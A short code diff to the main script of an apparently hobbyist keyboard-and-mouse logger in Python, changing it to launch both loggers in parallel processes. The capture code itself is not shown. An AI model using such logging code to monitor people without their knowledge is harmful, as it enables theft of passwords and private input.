@@ -1,7 +1,7 @@
 # Importing Libraries
 from KeyboardLogger import keyBoardLogger
 from MouseLogger import mouseLogger
-
+from multiprocessing import Process
 
 # Main Method
 if __name__ == '__main__':
@@ -15,10 +15,12 @@ if __name__ == '__main__':
     try:
 
         # Keyboard Logger
-        keyBoardLogger.runKeyBoardLogger()
+        process1 = Process(target = keyBoardLogger.runKeyBoardLogger)
+        process1.start()
 
         # Mouse Logger
-        mouseLogger().runMouseLogger()
+        process2 = Process(target = mouseLogger().runMouseLogger)
+        process2.start()
 
     except:
         print("Exception Message: Program Safely Terminated!")
